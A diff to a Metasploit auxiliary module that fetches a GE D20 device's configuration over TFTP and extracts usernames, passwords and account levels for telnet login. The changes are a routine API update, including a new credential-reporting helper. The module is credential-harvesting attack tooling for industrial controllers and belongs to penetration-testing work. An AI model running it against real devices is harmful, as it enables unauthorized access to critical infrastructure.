@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,11 +8,10 @@
 # parses the usernames and passwords from it.
 ##
 
-require 'msf/core'
 require 'rex/ui/text/shell'
 require 'rex/proto/tftp'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Rex::Ui::Text
   include Rex::Proto::TFTP
   include Msf::Exploit::Remote::Udp
@@ -40,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(69),
         Opt::RHOST('192.168.255.1'),
         OptString.new('REMOTE_CONFIG_NAME', [true, "The remote filename used to retrieve the configuration", "NVRAM\\D20.zlb"])
-      ], self.class)
+      ])
   end
 
   def setup
@@ -182,6 +181,32 @@ class Metasploit3 < Msf::Auxiliary
     return res
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   # Parse the usernames, passwords, and security levels from the config
   # It's a little ugly (lots of hard-coded offsets).
   # The userdata starts at an offset dictated by the B014USERS config
@@ -196,7 +221,7 @@ class Metasploit3 < Msf::Auxiliary
     headerlen = makeword(f.read(2))
     f.seek(userentryptr + 40) # sorry decimal
     entrylen = makeword(f.read(2)) # sorry this is decimal
-    logins = Rex::Ui::Text::Table.new(
+    logins = Rex::Text::Table.new(
       'Header' => "D20 usernames, passwords, and account levels\n(use for TELNET authentication)",
       'Indent' => 1,
       'Columns' => ["Type", "User Name", "Password"])
@@ -213,13 +238,13 @@ class Metasploit3 < Msf::Auxiliary
         break
       end
       logins <<  [accounttype,  accountname,  accountpass]
-      report_auth_info(
-        :host => datastore['RHOST'],
-        :port => 23,
-        :sname => "telnet",
-        :user => accountname,
-        :pass => accountpass,
-        :active => true
+      report_cred(
+        ip: datastore['RHOST'],
+        port: 23,
+        service_name: 'telnet',
+        user: accountname,
+        password: accountpass,
+        proof: accounttype
       )
     end
     if not logins.rows.empty?
